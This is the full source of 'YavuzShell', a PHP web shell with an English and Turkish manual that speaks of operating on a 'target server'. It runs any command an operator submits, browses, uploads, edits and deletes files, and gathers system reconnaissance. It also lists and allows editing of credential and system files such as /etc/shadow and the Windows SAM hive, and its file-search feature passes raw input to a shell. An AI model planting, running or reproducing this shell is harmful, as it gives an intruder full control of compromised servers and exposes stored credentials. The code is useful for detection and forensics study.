<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEACABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAABAABMcEcAsLCwAB4eHgCVlZUA9PT0AL+/vwD39/cAd3d3AFRUVAB8fHwA+vr6AERERADv7+8A0tLSAJ2dnQDu7u4A4ODgAOTk5ADAwMAApKSkALCwsADj4+MAq6urAHh4eADOzs4A2dnZANHR0QDt7e0A6OjoALS0tADf398A4eHhALCwsADCwsIAzs7OANfX1wDl5eUA5+fnAMrKygDU1NQAy8vLANzc3ADl5eUA9/f3AMXFxQDY2NgA8PDwANTU1ACgoKAAvb29AHV1dQC8vLwAsLCwAJiYmADV1dUA5ubmAJeXlwDX19cA5OTkAPLy8gDs7OwA////AP7+/gD9/f0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADBSwSAQsAAAAAAAAAABMtPAQGBjsfBQIAAAAAAAUlPz0/KwQECgQnCwAAAB0bPT4MLQUBFBgjNw0AAAgVPT8VFAAAAAADJiEiEgcsKz0RAwAAAAAAASojBhw0KT4EBQAAAAAAAikPJj42ODo9FQsAAAAAAygEPw89JA4qPzkAAAIAExEKPQoRDCU1EAooCSAgBx4/PRsNBwEUCCcKDRMzIR8KPT8iMgAAAAABDB4CHRoQLz89HA4AAAAAAA0kAQALFxA/PQYWAAAAAAAJGRoJAAAZPj0uFgAAAAAAAAkxMAgAEgwPGAMAAAAAAAAAABcIAAsBDgcAAAAAAPgfAADgBwAAwAMAAIADAAADwAAAB8AAAA+AAAAPAAAAGgAAAAAAAAAADwAAAA8AAIgPAACGDwAAwg8AAPIfAAA=" type="image/x-icon" />
    <title>YavuzShell</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #1b1b1b;
            color: #e0e0e0;
        }

        .container {
            display: flex;
        }

        .menu {
            width: 220px;
            background: linear-gradient(135deg, #2a2a2a, #1b1b1b);
            color: #ff0000;
            height: 100vh;
            padding: 15px;
            position: fixed;
        }

        .menu h2 {
            color: #ff0000;
            font-size: 1rem;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .menu ul li {
            padding: 6px 0;
        }

        .menu ul, li, a {
            color: #ff0000;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
            text-decoration-thickness: 2px;
        }

        .main_a{
            text-decoration: none;
        }

        .main_a:hover {
            text-decoration: none;
        }

        .content {
            flex-grow: 1;
            padding: 20px;
            background-color: #1e1e1e;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
            margin-left: 240px;
            margin-top: 20px;
        }

        .upload {
            border: 2px solid #444;
            background-color: #2a2a2a;
            width: 90%;
            padding: 20px;
            border-radius: 5px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            background-color: #2a2a2a;
        }

        table, th, td {
            border: 1px solid #444;
            padding: 10px;
            text-align: left;
        }

        th {
            background-color: #ff0000;
            color: white;
        }

        input[type="file"], input[type="submit"], input[type="text"], textarea {
            padding: 10px;
            margin-top: 10px;
            border-radius: 5px;
            border: 1px solid #666;
            background-color: #2a2a2a;
            color: #e0e0e0;
            width: 90%;
        }

        input[type="submit"] {
            background-color: #ff0000;
            color: white;
            cursor: pointer;
            font-weight: bold;
        }

        input[type="submit"]:hover {
            background-color: #e60000;
        }

        pre {
            background-color: #272727;
            color: #e0e0e0;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
        }

        span{
            color:red;
        }

        .lang {
            display: flex;
            justify-content: flex-end;
        }

        footer {
            background-color: #ff0000; 
            padding: 1px;
            text-align: center; 
            position: fixed; 
            bottom: 0;
            width: 100%; 
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="menu">
            <h2><a href="?" class="main_a">Main Page</a></h2>

            <h2>File Manager</h2>
            <ul id="file-manager">
                <li><a href="?action=list_files">List Files</a></li>
                <li><a href="?action=search_file">Search File</a></li>
                <li><a href="?action=config_files">Config Files</a></li>
            </ul>

            <h2>Commands</h2>
            <ul id="commands">
                <li><a href="?action=run_command">Run Command</a></li>
            </ul>

            <h2>Help</h2>
            <ul id="help">
                <li><a href="?action=help">User Manual</a></li>
            </ul>
        </div>


        <div class="content">
            <?php

            $currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
            function generatePathNav($currentDir)
            {
                $paths = explode('/', $currentDir);
                $fullPath = '';
                foreach ($paths as $key => $dir) {
                    if ($dir != '') {
                        $fullPath .= '/' . $dir;
                        echo "<a href='?action=list_files&dir=$fullPath'>$dir</a> / ";
                    }
                }
            }
            
            if (!isset($_GET['action']) || $_GET['action'] == '') {
                echo "<h1>System Information</h1>";
                date_default_timezone_set('Etc/GMT-2'); 
                echo "<p><span>Date and Time:</span> " . date('H:i / d.m.Y') . "</p>";
                echo "<p><span>Operating System:</span> " . PHP_OS . "</p>";
                echo "<p><span>IP Adress: </span>" . shell_exec('hostname -I') . "</p>";
                echo "<p><span>Server Software:</span> " . $_SERVER['SERVER_SOFTWARE'] . "</p>";
                echo "<p><span>PHP Version:</span> " . phpversion() . "</p>";
                echo "<p><span>User:</span> " . shell_exec('id') . "</p>";                
                echo "<p><span>User Groups:</span> " . shell_exec('groups') . "</p>"; 
                echo "<p><span>Server Name:</span> " . gethostname() . "</p>";
            }
            

            if (isset($_GET['action']) && $_GET['action'] == 'list_files') {
                echo "<h1>File Manager - List Files</h1>";

                echo "<p>Current Directory: ";
                generatePathNav($currentDir);
                $parentDir = dirname($currentDir);
                if ($currentDir !== '/') {
                    echo "<a href='?action=list_files&dir=$parentDir' style='font-size:20px;'>⤴</a>";
                }

                echo "</p>";

                echo "<div class='upload'>";
                echo "<h3>Upload a file to $currentDir</h3>";
                echo "<form action='?action=upload&dir=$currentDir' method='POST' enctype='multipart/form-data'>
                    <input type='file' name='file'>
                    <input type='submit' value='Upload'>
                  </form>";
                echo "</div>";

                if (isset($_GET['msg'])) {
                    echo "<p style='color: green; font-weight: bold;'>" . htmlspecialchars($_GET['msg']) . "</p>";
                }

                if (isset($_GET['error'])) {
                    echo "<p style='color: red; font-weight: bold;'>" . htmlspecialchars($_GET['error']) . "</p>";
                }

                $files = scandir($currentDir);
                echo "<table><tr><th>File Name</th><th>Permissions</th><th>Actions</th></tr>";
                foreach ($files as $file) {
                    if ($file !== '.' && $file !== '..') {
                        $filePath = "$currentDir/$file";
                        $filePerms = substr(sprintf('%o', fileperms($filePath)), -4);
                        $filePermsText = (is_readable($filePath) ? 'r' : '-') .
                            (is_writable($filePath) ? 'w' : '-') .
                            (is_executable($filePath) ? 'x' : '-');

                        if (is_dir($filePath)) {
                            echo "<tr><td><a href='?action=list_files&dir=$filePath'>$file</a></td><td>$filePerms ($filePermsText)</td>
                              <td>-</td></tr>";
                        } else {
                            echo "<tr><td>$file</td><td>$filePerms ($filePermsText)</td>
                              <td>
                                  <a href='?action=edit&file=$filePath'>Edit</a> | 
                                  <a href='?action=delete&file=$filePath'>Delete</a>
                              </td></tr>";
                        }
                    }
                }
                echo "</table>";
            }


            if (isset($_GET['action']) && $_GET['action'] == 'search_file') {
                echo "<h1>Search for Files</h1>";
                echo "<form action='?action=search_file' method='POST'>
                        <input class='search_input' type='text' name='filename' placeholder='Enter filename or part of it' value='".($_POST['filename'] ?? '')."'>
                        <input class='search_input' type='submit' value='Search'>
                      </form>";
            
                if (isset($_POST['filename'])) {
                    $filename = $_POST['filename'];
                    echo "<h2>Search Results for '$filename'</h2>";
                    echo "<pre>";
                    system("find / -iname '*$filename*' 2>/dev/null");
                    echo "</pre>";
                }
            }
            

            if (isset($_GET['action']) && $_GET['action'] == 'upload') {
                $targetDir = $_GET['dir'];
                $file = $_FILES['file']['tmp_name'];
                $onlyName = basename($_FILES['file']['name']);
                $destination = $targetDir . '/' . $onlyName;

                if (move_uploaded_file($file, $destination)) {
                    echo "<script>window.location.href = '?action=list_files&dir=$targetDir&msg=$onlyName uploaded successfully';</script>";
                } else {
                    echo "<script>window.location.href = '?action=list_files&dir=$targetDir&error=Failed upload';</script>";
                }
                exit;
            }

            if (isset($_GET['action']) && $_GET['action'] == 'delete') {
                $targetDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
                $file = $_GET['file'];
                $onlyName = basename($file);

                if (unlink($file)) {
                    echo "<script>window.location.href = '?action=list_files&dir=" . urlencode($targetDir) . "&msg=$onlyName has been deleted';</script>";
                } else {
                    echo "<script>window.location.href = '?action=list_files&dir=" . urlencode($targetDir) . "&error=Failed to delete file.';</script>";
                }
                exit;
            }


            if (isset($_GET['action']) && $_GET['action'] == 'edit') {
                $file = $_GET['file'];
                $content = @file_get_contents($file);
                if ($content === false) {
                    echo "<script>window.location.href = '?action=config_files&dir=$targetDir&error=Error: Cannot open file for editing. Please check the file permissions.';</script>";
                } else {
                    echo "<h1>Editing File: $file</h1>";
                    echo "<form action='?action=save&file=" . urlencode($file) . "' method='POST'>
                        <textarea name='content' rows='20' cols='80'>" . htmlspecialchars($content) . "</textarea>
                        <br>
                        <input type='submit' value='Save'>
                      </form>";
                }
            }

            if (isset($_GET['action']) && $_GET['action'] == 'save') {
                $file = $_GET['file'];
                $newContent = $_POST['content'];
                $onlyName = basename($file);

                if (is_writable($file)) {
                    try {
                        if (file_put_contents($file, $newContent) === false) {
                            throw new Exception("Failed to save file.");
                        } else {
                            $targetDir = urlencode(dirname($file));

                            $configFiles = ['/etc/passwd', '/etc/hosts', '/etc/fstab', '/etc/ssh/sshd_config'];
                            if (in_array($file, $configFiles)) {
                                echo "<script>window.location.href = '?action=config_files&msg=$onlyName saved successfully';</script>";
                            } else {
                                echo "<script>window.location.href = '?action=list_files&dir=$targetDir&msg=$onlyName saved successfully';</script>";
                            }
                        }
                    } catch (Exception $e) {
                        echo "<script>window.location.href = '?action=config_files&error=Error: Unable to save $onlyName. {$e->getMessage()}';</script>";
                    }
                } else {
                    echo "<script>window.location.href = '?action=config_files&error=Error: You do not have permission to edit $onlyName.';</script>";
                }
                exit;
            }

            if (isset($_GET['action']) && $_GET['action'] == 'run_command') {
                echo "<h1>Run Command</h1>";
                echo "<form action='?action=run_command' method='POST'>
                        <input type='text' name='command' placeholder='Enter command' value='".($_POST['command'] ?? '')."'>
                        <input type='submit' value='Execute'>
                      </form>";
            
                if (isset($_POST['command'])) {
                    $command = $_POST['command'];
                    echo "<h2>Command Output '$command'</h2>";
                    echo "<pre><h3>";
                    system($command);
                    echo "</h3></pre>";
                }
            }

            if (isset($_GET['action']) && $_GET['action'] == 'config_files') {
                echo "<h1>Important Configuration Files</h1>";

                $message = '';

                if (isset($_GET['msg'])) {
                    echo "<p style='color: green; font-weight: bold;'>" . htmlspecialchars($_GET['msg']) . "</p>";
                } elseif (isset($_GET['error'])) {
                    echo "<p style='color: red; font-weight: bold;'>" . htmlspecialchars($_GET['error']) . "</p>";
                }

                echo $message;

                $configFiles = [
                    '/etc/passwd',
                    '/etc/shadow',
                    '/etc/hosts',
                    '/etc/fstab',
                    '/etc/ssh/sshd_config',
                    '/etc/nginx/nginx.conf',
                    '/etc/apache2/apache2.conf',
                    '/etc/my.cnf',
                    '/etc/cron.d',
                    '/etc/cron.allow',
                    '/etc/cron.deny',

                    'C:\\Windows\\System32\\drivers\\etc\\hosts',             
                    'C:\\Windows\\System32\\config\\SAM',                     
                    'C:\\Windows\\System32\\config\\SYSTEM',                  
                    'C:\\Windows\\System32\\config\\SOFTWARE',               
                    'C:\\Windows\\System32\\config\\SECURITY',               
                    'C:\\Windows\\System32\\config\\DEFAULT',                 
                    'C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config', 
                    'C:\\Windows\\System32\\GroupPolicy\\Machine\\Registry.pol', 
                    'C:\\Windows\\System32\\GroupPolicy\\User\\Registry.pol',   
                    'C:\\inetpub\\wwwroot\\web.config',                        
                    'C:\\Program Files\\MySQL\\MySQL Server 8.0\\my.ini',      
                    'C:\\Windows\\System32\\Tasks',                            
                ];

                echo "<table><tr><th>File Name</th><th>Permissions</th><th>Actions</th></tr>";
                foreach ($configFiles as $file) {
                    if (file_exists($file)) {
                        $filePerms = substr(sprintf('%o', fileperms($file)), -4);
                        $filePermsText = (is_readable($file) ? 'r' : '-') .
                            (is_writable($file) ? 'w' : '-') .
                            (is_executable($file) ? 'x' : '-');

                        echo "<tr><td>$file</td><td>$filePerms ($filePermsText)</td>
                          <td><a href='?action=edit&file=" . urlencode($file) . "'>Edit</a></td></tr>";
                    } else {
                        $message .= "<div class='error'>Error: File '$file' does not exist.</div>";
                    }
                }
                echo "</table>";
            }

            $lang = isset($_GET['lang']) ? $_GET['lang'] : 'EN';

            if (isset($_GET['action']) && $_GET['action'] == 'help') {
                echo '
                <h1>User Manual</h1>
                <form class="lang" method="GET">
                    <input type="hidden" name="action" value="help">
                    <label for="lang">Select Language:</label>
                    <select name="lang" id="lang" onchange="this.form.submit()">
                        <option value="EN" ' . ($lang == 'EN' ? 'selected' : '') . '>EN</option>
                        <option value="TR" ' . ($lang == 'TR' ? 'selected' : '') . '>TR</option>
                    </select>
                </form>';
            
                if ($lang == 'TR') {
                    echo '
                    <h2><span>Main Page</span></h2>
                    <p style="font-size:18px;">Bu sayfa, hedef sunucu hakkında birtakım bilgileri edinmemize yardımcı olur. Sistemde çalışan işletim sistemi, IP adresi, sunucu yazılımı kullanıcı yetkisi ve grubu gibi verileri bize gösterir.</p>
                    
                    <h2><span>File Manager<span></h2>
                    <p style="font-size:18px;">Dosya işlemlerinin bulunduğu bu menüde 3 ana başlık bulunmakta. <br><br><span><a href="?action=list_files">List Files</a></span> sayfasında hedef sunucuda dizinler arasında gezebilir, dosya yükleme, düzenleme ve silme özelliklerini kullanabiliriz. Ayrıca dosya izinlerini de bize gösterecektir. <br><br><span><a href="?action=search_file">Search Files</a></span> sayfasında hedef sunucu içerisinde dosya arama işlevini gerçekleştirebiliriz. <br><br><span><a href="?action=config_files">Config Files</a></span> sayfasında, hassas sayılabilecek dosyalar tespit edilirse burada listelenir, yetkimiz varsa düzenleme ve okuma işlemleri yapılabilir.</p>
                    
                    <h2><span>Commands</span></h2>
                    <p style="font-size:18px;">Hedef sunucuda komut çalıştırmak istediğimizde Commands altında bulunan Run Command sayfasına başvurabiliriz.<br><br><span><a href="?action=run_command">Run Command</a></span> sayfasında bulunan input alanına girdiğimiz her komut sunucu tarafındna işlenip çıktısı verilecektir.</p>
                    ';
                } else {
                    echo '
                    <h2><span>Main Page</span></h2>
                    <p style="font-size:18px;">This page helps us obtain some information about the target server. It shows us data such as the operating system running on the system, IP address, server software user authorization and group.</p>

                    <h2><span>File Manager<span></h2>
                    <p style="font-size:18px;">There are 3 main headings in this menu where file operations are located. <br><br><span><a href="?action=list_files">List Files</a></span> page allows us to browse directories on the target server, upload, edit and delete files. It will also show us file permissions. <br><br><span><a href="?action=search_file">Search Files</a></span> page allows us to perform file search on the target server. <br><br><span><a href="?action=config_files">Config Files</a></span> page, if files that can be considered sensitive are detected, they are listed here, and if we have the authority, editing and reading operations can be performed.</p>

                    <h2><span>Commands</span></h2>
                    <p style="font-size:18px;">When we want to run a command on the target server, we can refer to the Run Command page under Commands. <br><br><span><a href="?action=run_command">Run Command</a></span> page, each command we enter in the input field will be processed by the server and its output will be given.</p>
                    ';
                }
            }

            ?>
        </div>
    <footer>
        <p>&copy;Yavuzlar Web Security and Software Team 2024</p>
    </footer>
</body>
</html>